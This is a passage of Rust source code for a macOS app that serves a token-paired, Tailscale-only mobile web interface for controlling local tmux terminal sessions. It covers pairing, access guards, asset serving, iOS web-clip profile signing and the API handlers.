//! Toranj on a phone.
//!
//! A small HTTP server on 127.0.0.1 serves the mobile web app (a PWA built
//! from `mobile.html`) and a JSON API. `tailscale serve` publishes it over
//! HTTPS inside the user's tailnet only, so the phone reaches it from
//! anywhere and nothing is exposed to the internet or the local network.
//!
//! Every API call needs a device token. A phone gets one by typing a short
//! pairing code shown in Settings; only a SHA-256 of each token is stored.
//! Notifications go out as Web Push, signed with this Mac's VAPID key and
//! encrypted for the phone, straight from here to the phone's push service.

use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::{Mutex, OnceLock};
use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};

use axum::extract::{Json, Query, Request};
use axum::http::{header, HeaderMap, HeaderValue, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::routing::{get, post};
use axum::Router;
use base64::Engine;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

/// `tailscale serve` publishes the app on this HTTPS port (443 stays free
/// for anything else the user serves).
const TS_PORT: u16 = 8443;
const PAIR_TTL: Duration = Duration::from_secs(10 * 60);
const PAIR_TRIES: u8 = 5;
/// A paired phone's token stops working after 30 days without use.
const TOKEN_IDLE_SECS: u64 = 30 * 86400;
/// The phone counts as the place to notify when the Mac has had no input
/// for this long.
const AWAY_SECS: f64 = 90.0;
const B64: base64::engine::GeneralPurpose = base64::engine::general_purpose::URL_SAFE_NO_PAD;

// ---------- stored config ----------

#[derive(Serialize, Deserialize, Clone)]
pub struct PushPrefs {
    pub done: bool,
    pub waiting: bool,
    pub error: bool,
    /// Only when the Mac has been idle (nobody at it).
    pub only_away: bool,
}

impl Default for PushPrefs {
    fn default() -> Self {
        Self { done: true, waiting: true, error: true, only_away: true }
    }
}

#[derive(Serialize, Deserialize, Clone)]
struct Sub {
    endpoint: String,
    p256dh: String,
    auth: String,
}

#[derive(Serialize, Deserialize, Clone)]
struct Device {
    id: String,
    name: String,
    token_sha256: String,
    created: u64,
    last_seen: u64,
    #[serde(default)]
    sub: Option<Sub>,
}

#[derive(Serialize, Deserialize, Default)]
struct Config {
    #[serde(default)]
    enabled: bool,
    #[serde(default)]
    port: u16,
    /// VAPID private key, raw P-256 scalar, base64url.
    #[serde(default)]
    vapid: String,
    #[serde(default)]
    devices: Vec<Device>,
    #[serde(default)]
    push: PushPrefs,
    /// This Mac's MagicDNS name and its Tailscale owner's login, as last
    /// seen: requests through Tailscale must carry exactly these.
    #[serde(default)]
    ts_host: String,
    #[serde(default)]
    ts_owner: String,
}

static CFG: Mutex<Option<Config>> = Mutex::new(None);

fn config_path() -> PathBuf {
    #[cfg(test)]
    return std::env::temp_dir().join(format!("toranj-mobile-test-{}", std::process::id())).join("mobile.json");
    #[cfg(not(test))]
    dirs::data_dir()
        .unwrap_or_default()
        .join("io.github.hrvojecukman.toranj")
        .join("mobile.json")
}

fn with_cfg<T>(f: impl FnOnce(&mut Config) -> T) -> T {
    let mut g = CFG.lock().unwrap_or_else(|e| e.into_inner());
    let cfg = g.get_or_insert_with(|| {
        std::fs::read(config_path())
            .ok()
            .and_then(|b| serde_json::from_slice(&b).ok())
            .unwrap_or_default()
    });
    f(cfg)
}

/// Writes the config readable by this user only (it holds the VAPID key).
fn save(cfg: &Config) -> Result<(), String> {
    use std::io::Write;
    use std::os::unix::fs::OpenOptionsExt;
    let path = config_path();
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir).map_err(|e| e.to_string())?;
    }
    let tmp = path.with_extension("json.tmp");
    let _ = std::fs::remove_file(&tmp);
    let mut f = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(&tmp)
        .map_err(|e| e.to_string())?;
    f.write_all(&serde_json::to_vec_pretty(cfg).map_err(|e| e.to_string())?)
        .map_err(|e| e.to_string())?;
    std::fs::rename(&tmp, &path).map_err(|e| e.to_string())
}

fn now() -> u64 {
    SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0)
}

fn random_bytes<const N: usize>() -> [u8; N] {
    let mut b = [0u8; N];
    getrandom(&mut b);
    b
}

fn getrandom(buf: &mut [u8]) {
    use rand::RngExt;
    rand::rng().fill(buf);
}

fn sha_hex(s: &str) -> String {
    Sha256::digest(s.as_bytes()).iter().map(|b| format!("{b:02x}")).collect()
}

/// Constant-time equality, so a token can't be guessed byte by byte.
fn same(a: &str, b: &str) -> bool {
    a.len() == b.len() && a.bytes().zip(b.bytes()).fold(0u8, |acc, (x, y)| acc | (x ^ y)) == 0
}

// ---------- tailscale ----------

fn ts_bin() -> Option<&'static str> {
    [
        "/Applications/Tailscale.app/Contents/MacOS/Tailscale",
        "/opt/homebrew/bin/tailscale",
        "/usr/local/bin/tailscale",
    ]
    .into_iter()
    .find(|p| std::path::Path::new(p).is_file())
}

/// Runs the Tailscale CLI with a 10 s limit. `tailscale serve` waits for an
/// admin to enable Serve/HTTPS and prints a login.tailscale.com link; that
/// link is returned in the error instead of hanging.
fn ts(args: &[&str]) -> Result<String, String> {
    use std::io::Read;
    let bin = ts_bin().ok_or("Tailscale is not installed")?;
    let mut child = std::process::Command::new(bin)
        .args(args)
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .map_err(|e| e.to_string())?;
    let mut out_pipe = child.stdout.take();
    let mut err_pipe = child.stderr.take();
    let reader = std::thread::spawn(move || {
        let (mut o, mut e) = (String::new(), String::new());
        if let Some(p) = out_pipe.as_mut() {
            let _ = p.take(1 << 20).read_to_string(&mut o);
        }
        if let Some(p) = err_pipe.as_mut() {
            let _ = p.take(1 << 16).read_to_string(&mut e);
        }
        (o, e)
    });
    let deadline = Instant::now() + Duration::from_secs(10);
    let status = loop {
        match child.try_wait() {
            Ok(Some(st)) => break Some(st),
            Ok(None) if Instant::now() < deadline => std::thread::sleep(Duration::from_millis(50)),
            _ => {
                let _ = child.kill();
                let _ = child.wait();
                break None;
            }
        }
    };
    let (out, err) = reader.join().unwrap_or_default();
    let link = |s: &str| {
        s.split_whitespace()
            .find(|w| w.starts_with("https://login.tailscale.com/"))
            .map(|w| w.chars().filter(|c| !c.is_control()).take(300).collect::<String>())
    };
    match status {
        Some(st) if st.success() => Ok(out),
        other => {
            if let Some(l) = link(&out).or_else(|| link(&err)) {
                return Err(format!("Tailscale needs this enabled first: {l}"));
            }
            if other.is_none() {
                return Err("Tailscale did not answer".into());
            }
            let msg = err.lines().find(|l| !l.trim().is_empty()).unwrap_or("tailscale failed").trim();
            Err(msg.chars().filter(|c| !c.is_control()).take(300).collect())
        }
    }
}

/// This Mac's MagicDNS name (e.g. `mac.tail1234.ts.net`) and its owner's
/// login, while Tailscale runs. Remembered in the config.
fn ts_identity() -> Option<(String, String)> {
    let v: serde_json::Value = serde_json::from_str(&ts(&["status", "--json"]).ok()?).ok()?;
    if v.get("BackendState")?.as_str()? != "Running" {
        return None;
    }
    let me = v.get("Self")?;
    let name = me.get("DNSName")?.as_str()?.trim_end_matches('.').to_ascii_lowercase();
    let ok = !name.is_empty() && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '.');
    let uid = me.get("UserID")?.to_string();
    let owner = v.get("User")?.get(&uid)?.get("LoginName")?.as_str()?.to_ascii_lowercase();
    if !ok || owner.is_empty() {
        return None;
    }
    with_cfg(|c| {
        if c.ts_host != name || c.ts_owner != owner {
            c.ts_host = name.clone();
            c.ts_owner = owner.clone();
            let _ = save(c);
        }
    });
    Some((name, owner))
}

/// Whether `tailscale serve` publishes port 8443 to exactly our server, and
/// whether Funnel (the public internet) is on for it.
fn ts_serving(name: &str, port: u16) -> (bool, bool) {
    let Ok(text) = ts(&["serve", "status", "--json"]) else { return (false, false) };
    let Ok(v) = serde_json::from_str::<serde_json::Value>(&text) else { return (false, false) };
    let key = format!("{name}:{TS_PORT}");
    let https = v.pointer(&format!("/TCP/{TS_PORT}/HTTPS")).and_then(|x| x.as_bool()) == Some(true);
    let proxy = v
        .get("Web")
        .and_then(|w| w.get(&key))
        .and_then(|w| w.pointer("/Handlers/~1/Proxy"))
        .and_then(|x| x.as_str())
        == Some(format!("http://127.0.0.1:{port}").as_str());
    let funnel = v.get("AllowFunnel").and_then(|f| f.get(&key)).and_then(|x| x.as_bool()) == Some(true);
    (https && proxy, funnel)
}

fn ts_serve_on(port: u16) -> Result<(), String> {
    ts(&["serve", "--bg", &format!("--https={TS_PORT}"), &format!("http://127.0.0.1:{port}")]).map(|_| ())
}

fn ts_serve_off() {
    let _ = ts(&["serve", &format!("--https={TS_PORT}"), "off"]);
}

/// Points `tailscale serve` at our port when it isn't already (after a
/// restart, a port change or a Tailscale login).
fn sync_serve(port: u16) -> Result<(), String> {
    if ts_bin().is_none() {
        return Ok(());
    }
    let Some((name, _)) = ts_identity() else { return Ok(()) };
    if !ts_serving(&name, port).0 {
        ts_serve_on(port).map_err(|e| format!("Tailscale could not publish Toranj: {e}"))?;
    }
    Ok(())
}

// ---------- server ----------

static APP: OnceLock<tauri::AppHandle> = OnceLock::new();
static STOP: Mutex<Option<tokio::sync::oneshot::Sender<()>>> = Mutex::new(None);

struct Pairing {
    code: String,
    until: Instant,
    tries: u8,
}
static PAIR: Mutex<Option<Pairing>> = Mutex::new(None);

/// Starts the server if phone access is on, off the main thread (Tailscale
/// calls take a moment).
pub fn init(app: &tauri::AppHandle) {
    let _ = APP.set(app.clone());
    if !with_cfg(|c| c.enabled) {
        return;
    }
    std::thread::spawn(|| match with_cfg(ensure_vapid).and_then(|_| start()) {
        Ok(port) => {
            if let Err(e) = sync_serve(port) {
                eprintln!("toranj mobile: {e}");
            }
        }
        Err(e) => eprintln!("toranj mobile: {e}"),
    });
}

/// On quit: stop publishing through Tailscale, so nothing else can answer
/// on the phone's address while Toranj isn't running. `init` publishes again.
pub fn shutdown() {
    if with_cfg(|c| c.enabled) {
        stop();
        if ts_bin().is_some() {
            ts_serve_off();
        }
    }
}

fn running() -> bool {
    STOP.lock().unwrap_or_else(|e| e.into_inner()).is_some()
}

/// Binds 127.0.0.1 (the saved port, or a new one) and serves until `stop`.
/// The lock is held throughout, so two calls can't start two servers.
fn start() -> Result<u16, String> {
    // Copies made while no phone looks still get their time.
    crate::phone::watch_clipboard();
    let mut slot = STOP.lock().unwrap_or_else(|e| e.into_inner());
    if slot.is_some() {
        return Ok(with_cfg(|c| c.port));
    }
    let want = with_cfg(|c| c.port);
    let std_listener = std::net::TcpListener::bind(("127.0.0.1", want))
        .or_else(|_| std::net::TcpListener::bind(("127.0.0.1", 0)))
        .map_err(|e| e.to_string())?;
    std_listener.set_nonblocking(true).map_err(|e| e.to_string())?;
    let port = std_listener.local_addr().map_err(|e| e.to_string())?.port();
    with_cfg(|c| {
        if c.port != port {
            c.port = port;
            let _ = save(c);
        }
    });
    let listener = tauri::async_runtime::block_on(async { tokio::net::TcpListener::from_std(std_listener) }).map_err(|e| e.to_string())?;
    let (tx, rx) = tokio::sync::oneshot::channel::<()>();
    *slot = Some(tx);
    tauri::async_runtime::spawn(async move {
        let _ = axum::serve(listener, router().into_make_service_with_connect_info::<SocketAddr>())
            .with_graceful_shutdown(async {
                let _ = rx.await;
            })
            .await;
    });
    Ok(port)
}

fn stop() {
    if let Some(tx) = STOP.lock().unwrap_or_else(|e| e.into_inner()).take() {
        let _ = tx.send(());
    }
}

fn router() -> Router {
    Router::new()
        .route("/api/pair", post(api_pair))
        .route("/api/me", get(api_me))
        .route("/api/snapshot", get(api_snapshot))
        .route("/api/projects", get(api_projects))
        .route("/api/recent", get(api_recent))
        .route("/api/peek", get(api_peek))
        .route("/api/screen", get(api_screen))
        .route("/api/answer", post(api_answer))
        .route("/api/send", post(api_send))
        .route("/api/create", post(api_create))
        .route("/api/kill", post(api_kill))
        .route("/api/messages", get(api_messages))
        .route("/api/clipboard", get(api_clipboard))
        .route(
            "/api/upload",
            post(api_upload).layer(axum::extract::DefaultBodyLimit::max(crate::phone::UPLOAD_MAX + 1024)),
        )
        .route("/api/push/subscribe", post(api_subscribe))
        .route("/api/push/test", post(api_push_test))
        .route("/toranj.mobileconfig", get(webclip))
        .fallback(get(static_file))
        .layer(axum::middleware::from_fn(guard))
}

/// Who may talk to the server at all, before any route runs:
/// - Host must be this server: 127.0.0.1/localhost on our port, or this
///   Mac's tailnet name (so a web page on the Mac can't get in by DNS
///   rebinding).
/// - Through Tailscale, the request must come from a device logged in as
///   this Mac's owner (`Tailscale-User-Login`, set by tailscaled and never
///   taken from the client). Other tailnet users and tagged machines are
///   refused, even before pairing.
/// - Never from the internet: Funnel requests are refused.
/// - Writes only from our own page (no cross-site form posts).
async fn guard(req: Request, next: axum::middleware::Next) -> Response {
    // Read what's needed first: a borrow of the request can't live across
    // the await below (the body isn't Sync).
    let headers = req.headers().clone();
    let hdr = |n: &str| headers.get(n).and_then(|h| h.to_str().ok()).unwrap_or("").to_ascii_lowercase();
    let host = hdr("host");
    let (port, ts_host, ts_owner) = with_cfg(|c| (c.port, c.ts_host.clone(), c.ts_owner.clone()));
    let local = host == format!("127.0.0.1:{port}") || host == format!("localhost:{port}");
    let bare = host.strip_suffix(&format!(":{TS_PORT}")).unwrap_or(&host);
    let via_ts = !ts_host.is_empty() && bare == ts_host;
    let deny = |code: StatusCode, msg: &'static str| (code, msg).into_response();
    if !local && !via_ts {
        return deny(StatusCode::MISDIRECTED_REQUEST, "wrong host");
    }
    if headers.contains_key("tailscale-funnel-request") {
        return deny(StatusCode::FORBIDDEN, "not from the internet");
    }
    let login = hdr("tailscale-user-login");
    if (via_ts || !login.is_empty()) && (ts_owner.is_empty() || !same(&login, &ts_owner)) {
        return deny(StatusCode::FORBIDDEN, "only the Mac owner's devices");
    }
    let method = req.method().clone();
    if method != axum::http::Method::GET && method != axum::http::Method::HEAD {
        let origin = hdr("origin");
        let own = origin.is_empty() || origin == format!("https://{host}") || origin == format!("http://{host}");
        if !own || hdr("sec-fetch-site") == "cross-site" {
            return deny(StatusCode::FORBIDDEN, "cross-site request");
        }
    }
    let mut res = next.run(req).await;
    let h = res.headers_mut();
    h.insert(header::X_FRAME_OPTIONS, HeaderValue::from_static("DENY"));
    h.insert(header::REFERRER_POLICY, HeaderValue::from_static("no-referrer"));
    h.insert(header::X_CONTENT_TYPE_OPTIONS, HeaderValue::from_static("nosniff"));
    h.insert(
        header::CONTENT_SECURITY_POLICY,
        HeaderValue::from_static("default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; frame-ancestors 'none'; base-uri 'none'; form-action 'none'"),
    );
    if !h.contains_key(header::CACHE_CONTROL) {
        h.insert(header::CACHE_CONTROL, HeaderValue::from_static("no-store"));
    }
    res
}

/// The mobile app's files, from the assets built into Toranj.
async fn static_file(uri: axum::http::Uri) -> Response {
    let path = match uri.path() {
        "/" => "mobile.html",
        p => p.strip_prefix('/').unwrap_or(p),
    };
    let Some(app) = APP.get() else { return StatusCode::SERVICE_UNAVAILABLE.into_response() };
    if !mobile_asset(app, path) {
        return StatusCode::NOT_FOUND.into_response();
    }

    match app.asset_resolver().get(path.to_string()) {
        Some(a) => {
            let mime = if path.ends_with(".webmanifest") {
                "application/manifest+json".to_string()
            } else {
                a.mime_type.clone()
            };
            let mut res = (StatusCode::OK, a.bytes.clone()).into_response();
            if let Ok(v) = HeaderValue::from_str(&mime) {
                res.headers_mut().insert(header::CONTENT_TYPE, v);
            }
            if path.starts_with("assets/") {
                // Hashed file names: safe to keep.
                res.headers_mut().insert(header::CACHE_CONTROL, HeaderValue::from_static("public, max-age=31536000, immutable"));
            }
            if path == "sw.js" {
                res.headers_mut().insert(header::CACHE_CONTROL, HeaderValue::from_static("no-cache"));
            }
            res
        }
        None => StatusCode::NOT_FOUND.into_response(),
    }
}

/// Only the mobile app's own files, by exact name: never the desktop page,
/// and no fallback (Tauri's resolver would answer unknown paths with it).
fn mobile_asset(app: &tauri::AppHandle, path: &str) -> bool {
    static KEYS: OnceLock<std::collections::HashSet<String>> = OnceLock::new();
    let keys = KEYS.get_or_init(|| {
        app.asset_resolver()
            .iter()
            .map(|(k, _)| k.trim_start_matches('/').to_string())
            .collect()
    });
    let fixed = matches!(path, "mobile.html" | "sw.js" | "manifest.webmanifest" | "m-icon-180.png" | "m-icon-192.png" | "m-icon-512.png");
    let ok_name = path.bytes().all(|b| b.is_ascii_alphanumeric() || b"._-/".contains(&b)) && !path.contains("..");
    let asset = path.starts_with("assets/") && !path.starts_with("assets/main-") && (path.ends_with(".js") || path.ends_with(".css"));
    ok_name && (fixed || asset) && keys.contains(path)
}

#[derive(Deserialize)]
struct ClipQ {
    #[serde(default)]
    code: String,
}

/// A configuration profile with a Home Screen web clip for this server, the
/// way TestFlight-style distribution pages add their icon: one tap, then
/// Install in Settings. The clip opens the app full screen; a pairing code
/// from the QR rides along so the clip pairs itself. Holds nothing secret:
/// the code is the one the phone already has, and the guard still applies.
async fn webclip(h: HeaderMap, Query(q): Query<ClipQ>) -> Response {
    let host = h.get(header::HOST).and_then(|v| v.to_str().ok()).unwrap_or("").to_ascii_lowercase();
    let ts_host = with_cfg(|c| c.ts_host.clone());
    if ts_host.is_empty() || host.strip_suffix(&format!(":{TS_PORT}")).unwrap_or(&host) != ts_host {
        return (StatusCode::BAD_REQUEST, "open this from the phone app").into_response();
    }
    let code: String = q.code.chars().filter(|c| c.is_ascii_alphanumeric()).take(12).collect();
    // In the query, not the fragment: iOS keeps a web clip's URL as given,
    // and the app reads the code from either.
    let url = if code.is_empty() {
        format!("https://{ts_host}:{TS_PORT}/")
    } else {
        format!("https://{ts_host}:{TS_PORT}/?pair={code}")
    };
    let icon = APP
        .get()
        .and_then(|a| a.asset_resolver().get("m-icon-180.png".into()))
        .map(|a| base64::engine::general_purpose::STANDARD.encode(&a.bytes))
        .unwrap_or_default();
    let xml = webclip_profile(&url, &icon, &uuid(), &uuid());
    let body = tauri::async_runtime::spawn_blocking(move || sign_profile(xml.as_bytes()).unwrap_or_else(|| xml.into_bytes()))
        .await
        .unwrap_or_default();
    let mut res = (StatusCode::OK, body).into_response();
    res.headers_mut().insert(header::CONTENT_TYPE, HeaderValue::from_static("application/x-apple-aspen-config"));
    res.headers_mut().insert(header::CONTENT_DISPOSITION, HeaderValue::from_static("attachment; filename=\"Toranj.mobileconfig\""));
    res
}

/// The keychain's Developer ID Application certificate (name, subject key
/// ID), if this Mac has one. Looked up once.
fn signing_identity() -> Option<(String, String)> {
    static ID: OnceLock<Option<(String, String)>> = OnceLock::new();
    ID.get_or_init(|| {
        let out = std::process::Command::new("/usr/bin/security").args(["find-identity", "-v", "-p", "codesigning"]).output().ok()?;
        let text = String::from_utf8_lossy(&out.stdout);
        let name = text.lines().find_map(|l| {
            let start = l.find("\"Developer ID Application: ")? + 1;
            let end = l[start..].find('"')? + start;
            Some(l[start..end].to_string())
        })?;
        let pem = std::process::Command::new("/usr/bin/security").args(["find-certificate", "-c", &name, "-p"]).output().ok()?;
        let mut x = std::process::Command::new("/usr/bin/openssl")
            .args(["x509", "-noout", "-text"])
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::null())
            .spawn()
            .ok()?;
        {
            use std::io::Write;
            x.stdin.take()?.write_all(&pem.stdout).ok()?;
        }
        let parsed = String::from_utf8_lossy(&x.wait_with_output().ok()?.stdout).into_owned();
        let mut lines = parsed.lines();
        lines.find(|l| l.contains("Subject Key Identifier"))?;
        let skid: String = lines.next()?.chars().filter(|c| c.is_ascii_hexdigit()).collect();
        (skid.len() == 40).then_some((name, skid))
    })
    .clone()
}

/// Signs a profile with this Mac's Developer ID certificate (CMS, by the
/// macOS `security` tool, the key never leaves the keychain), so iOS shows
/// it as Verified. None when there is no such certificate or signing fails:
/// the profile then goes out unsigned and works the same.
fn sign_profile(xml: &[u8]) -> Option<Vec<u8>> {
    use std::os::unix::fs::DirBuilderExt;
    let (name, skid) = signing_identity()?;
    let dir = std::env::temp_dir().join(format!("toranj-profile-{}", B64.encode(random_bytes::<9>())));
    std::fs::DirBuilder::new().mode(0o700).create(&dir).ok()?;
    let (inp, out) = (dir.join("in.mobileconfig"), dir.join("out.mobileconfig"));
    let signed = (|| {
        std::fs::write(&inp, xml).ok()?;
        let ok = std::process::Command::new("/usr/bin/security")
            .args(["cms", "-S", "-Z", &skid])
            .arg("-i")
            .arg(&inp)
            .arg("-o")
            .arg(&out)
            .output()
            .ok()?
            .status
            .success();
        if !ok {
            return None;
        }
        // Make sure it was signed by that certificate and nothing else.
        let check = std::process::Command::new("/usr/bin/security").args(["cms", "-D", "-h", "0"]).arg("-i").arg(&out).output().ok()?;
        let info = String::from_utf8_lossy(&check.stdout);
        let expect = format!("signer0.id=\"{name}\"");
        (info.contains(&expect) && info.contains("nsigners=1")).then(|| std::fs::read(&out).ok())?
    })();
    let _ = std::fs::remove_dir_all(&dir);
    signed
}

fn uuid() -> String {
    let b = random_bytes::<16>();
    let hex: String = b.iter().map(|x| format!("{x:02X}")).collect();
    format!("{}-{}-4{}-A{}-{}", &hex[0..8], &hex[8..12], &hex[13..16], &hex[17..20], &hex[20..32])
}

fn xml_escape(s: &str) -> String {
    s.replace('&', "&amp;").replace('<', "&lt;").replace('>', "&gt;").replace('"', "&quot;")
}

fn webclip_profile(url: &str, icon_b64: &str, clip_uuid: &str, profile_uuid: &str) -> String {
    let icon = if icon_b64.is_empty() { String::new() } else { format!("<key>Icon</key><data>{icon_b64}</data><key>Precomposed</key><true/>") };
    format!(
        r#"<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>PayloadContent</key><array><dict>
<key>PayloadType</key><string>com.apple.webClip.managed</string>
<key>PayloadVersion</key><integer>1</integer>
<key>PayloadIdentifier</key><string>io.github.hrvojecukman.toranj.webclip</string>
<key>PayloadUUID</key><string>{clip_uuid}</string>
<key>PayloadDisplayName</key><string>Toranj</string>
<key>Label</key><string>Toranj</string>
<key>URL</key><string>{url}</string>
<key>FullScreen</key><true/>
<key>IsRemovable</key><true/>
{icon}
</dict></array>
<key>PayloadType</key><string>Configuration</string>
<key>PayloadVersion</key><integer>1</integer>
<key>PayloadIdentifier</key><string>io.github.hrvojecukman.toranj.profile</string>
<key>PayloadUUID</key><string>{profile_uuid}</string>
<key>PayloadDisplayName</key><string>Toranj</string>
<key>PayloadDescription</key><string>Adds Toranj to your Home Screen. It only opens Toranj on your Mac through Tailscale and changes no settings.</string>
<key>PayloadRemovalDisallowed</key><false/>
</dict></plist>
"#,
        url = xml_escape(url)
    )
}

type ApiResult = Result<Response, (StatusCode, String)>;

fn bad(msg: impl Into<String>) -> (StatusCode, String) {
    (StatusCode::BAD_REQUEST, msg.into())
}

/// The paired device behind the request's bearer token.
fn auth(h: &HeaderMap) -> Result<String, (StatusCode, String)> {
    let token = h
        .get(header::AUTHORIZATION)
        .and_then(|v| v.to_str().ok())
        .and_then(|v| v.strip_prefix("Bearer "))
        .unwrap_or("");
    let denied = (StatusCode::UNAUTHORIZED, "not paired".to_string());
    if token.len() < 32 || token.len() > 128 {
        return Err(denied);
    }
    let hash = sha_hex(token);
    with_cfg(|c| {
        let mut found = None;
        for d in c.devices.iter_mut() {
            if same(&d.token_sha256, &hash) {
                found = Some(d);
            }
        }
        let d = found.ok_or(denied.clone())?;
        let t = now();
        // A phone unused for 30 days has to pair again.
        if t.saturating_sub(d.last_seen) > TOKEN_IDLE_SECS {
            return Err(denied);
        }
        let id = d.id.clone();
        if t.saturating_sub(d.last_seen) > 600 {
            d.last_seen = t;
            let _ = save(c);
        }
        Ok(id)
    })
}

/// Runs blocking work (tmux, ps, files) off the server's threads.
async fn blocking<T: Send + 'static>(f: impl FnOnce() -> Result<T, String> + Send + 'static) -> Result<T, (StatusCode, String)> {
    tauri::async_runtime::spawn_blocking(f)
        .await
        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?
        .map_err(|e| {
            let gone = e.contains("no longer exists");
            (if gone { StatusCode::NOT_FOUND } else { StatusCode::CONFLICT }, e)
        })
}

fn valid_tab(name: &str) -> Result<(), (StatusCode, String)> {
    if crate::spool::valid_tab(name) {
        Ok(())
    } else {
        Err(bad("unknown terminal"))
    }
}

#[derive(Deserialize)]
struct PairReq {
    code: String,
    name: String,
}

async fn api_pair(Json(r): Json<PairReq>) -> ApiResult {
    let code: String = r.code.chars().filter(|c| c.is_ascii_alphanumeric()).collect::<String>().to_ascii_uppercase();
    {
        let mut g = PAIR.lock().unwrap_or_else(|e| e.into_inner());
        let Some(p) = g.as_mut() else { return Err((StatusCode::FORBIDDEN, "Start pairing in Toranj’s Settings on the Mac first.".into())) };
        if p.until < Instant::now() {
            *g = None;
            return Err((StatusCode::FORBIDDEN, "The code has expired. Start pairing again on the Mac.".into()));
        }
        if !same(&p.code, &code) {
            p.tries += 1;
            if p.tries >= PAIR_TRIES {
                *g = None;
                return Err((StatusCode::FORBIDDEN, "Too many wrong codes. Start pairing again on the Mac.".into()));
            }
            return Err((StatusCode::FORBIDDEN, "Wrong code.".into()));
        }
        *g = None; // single use
    }
    let token = B64.encode(random_bytes::<32>());
    let name: String = r.name.chars().filter(|c| !c.is_control()).take(40).collect::<String>().trim().to_string();
    let device = Device {
        id: B64.encode(random_bytes::<9>()),
        name: if name.is_empty() { "Phone".into() } else { name },
        token_sha256: sha_hex(&token),
        created: now(),
        last_seen: now(),
        sub: None,
    };
    with_cfg(|c| {
        c.devices.push(device);
        save(c)
    })
    .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e))?;
    notify_desktop_with("paired");
    Ok(Json(serde_json::json!({ "token": token })).into_response())
}

async fn api_me(h: HeaderMap) -> ApiResult {
    let id = auth(&h)?;
    let (name, push, vapid) = with_cfg(|c| {
        let d = c.devices.iter().find(|d| d.id == id);
        (d.map(|d| d.name.clone()).unwrap_or_default(), d.is_some_and(|d| d.sub.is_some()), vapid_public(c))
    });
    Ok(Json(serde_json::json!({ "name": name, "push": push, "vapid": vapid })).into_response())
}

async fn api_snapshot(h: HeaderMap) -> ApiResult {
    auth(&h)?;
    let snap = blocking(|| Ok(crate::status::snapshot(&crate::tmux::list()))).await?;
    Ok(Json(snap).into_response())
}

async fn api_projects(h: HeaderMap) -> ApiResult {
    auth(&h)?;
    let p = blocking(|| Ok(crate::projects::scan())).await?;
    Ok(Json(p).into_response())
}

#[derive(Deserialize)]
struct CwdQ {
    cwd: String,
}

async fn api_recent(h: HeaderMap, Query(q): Query<CwdQ>) -> ApiResult {
    auth(&h)?;
    Ok(Json(crate::history::recent_sessions(q.cwd).await).into_response())
}

#[derive(Deserialize)]
struct NameQ {
    name: String,
}

async fn api_peek(h: HeaderMap, Query(q): Query<NameQ>) -> ApiResult {
    auth(&h)?;
    valid_tab(&q.name)?;
    let p = blocking(move || crate::tmux::peek(&q.name)).await?;
    Ok(Json(p).into_response())
}

async fn api_screen(h: HeaderMap, Query(q): Query<NameQ>) -> ApiResult {
    auth(&h)?;
    valid_tab(&q.name)?;
    let (text, cols) = blocking(move || crate::tmux::capture_color(&q.name, 400)).await?;
    Ok(Json(serde_json::json!({ "text": text, "cols": cols })).into_response())
}

#[derive(Deserialize)]
struct AnswerReq {
    name: String,
    key: String,
    fingerprint: String,
}

async fn api_answer(h: HeaderMap, Json(r): Json<AnswerReq>) -> ApiResult {
    auth(&h)?;
    valid_tab(&r.name)?;
    if !(r.key.len() == 1 && r.key.chars().all(|c| ('1'..='9').contains(&c))) {
        return Err(bad("key not allowed"));
    }
    blocking(move || crate::tmux::answer(&r.name, &r.key, &r.fingerprint)).await?;
    Ok(StatusCode::NO_CONTENT.into_response())
}

#[derive(Deserialize)]
struct SendReq {
    name: String,
    #[serde(default)]
    text: String,
    #[serde(default)]
    key: String,
    /// Paths of this phone's uploads, attached before the text.
    #[serde(default)]
    files: Vec<String>,
}

async fn api_send(h: HeaderMap, Json(r): Json<SendReq>) -> ApiResult {
    auth(&h)?;
    valid_tab(&r.name)?;
    if r.files.len() > 10 || !r.files.iter().all(|f| crate::phone::upload_ok(f)) {
        return Err(bad("attachment not found; add it again"));
    }
    blocking(move || {
        if !r.key.is_empty() {
            crate::tmux::send_key(&r.name, &r.key)
        } else {
            crate::tmux::send_with_files(&r.name, &r.text, &r.files)
        }
    })
    .await?;
    Ok(StatusCode::NO_CONTENT.into_response())
}

#[derive(Deserialize)]
struct CreateReq {
    project: String,
    cwd: String,
    command: String,
}

/// The phone can start what its New terminal offers and nothing else:
/// claude (optionally resuming a conversation), codex or a shell, in one of
/// the known projects.
fn phone_command_ok(cmd: &str) -> bool {
    match cmd {
        "" | "claude" | "codex" => true,
        c => c.strip_prefix("claude --resume ").is_some_and(crate::status::safe_id),
    }
}

async fn api_create(h: HeaderMap, Json(r): Json<CreateReq>) -> ApiResult {
    auth(&h)?;
    if !phone_command_ok(&r.command) || r.project != r.cwd {
        return Err(bad("not allowed from the phone"));
    }
    let name = blocking(move || {
        if !crate::projects::scan().iter().any(|p| p.path == r.cwd) {
            return Err("unknown project".to_string());
        }
        crate::tmux::create(&r.project, &r.cwd, &r.command)
    })
    .await?;
    Ok(Json(serde_json::json!({ "name": name })).into_response())
}

async fn api_kill(h: HeaderMap, Json(r): Json<NameQ>) -> ApiResult {
    auth(&h)?;
    valid_tab(&r.name)?;
    blocking(move || crate::tmux::kill(&r.name)).await?;
    Ok(StatusCode::NO_CONTENT.into_response())
}

#[derive(Deserialize)]
struct MessagesQ {
    session: String,
    #[serde(default)]
    cwd: String,
    /// The transcript length the phone already shows.
    #[serde(default)]
    len: u64,
}

/// A tab's Claude conversation as messages and tool calls.
